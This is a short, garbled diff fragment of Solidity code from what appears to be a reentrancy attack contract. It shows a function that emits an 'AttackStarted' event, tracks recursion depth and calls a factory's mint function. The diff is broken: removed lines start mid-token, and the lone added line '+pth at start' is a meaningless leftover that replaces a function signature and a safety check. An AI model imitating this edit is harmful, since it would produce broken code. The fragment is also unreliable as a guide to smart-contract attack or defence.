@@ -1,6 +1,4 @@
-t) external onlyOwner {
-        require(address(factory) != address(0), "factory not set");
-        recursionDepth = 0; // reset depth at start
+pth at start
         emit AttackStarted(optionId);
         factory.mint(optionId, address(this), amount, "");
     }
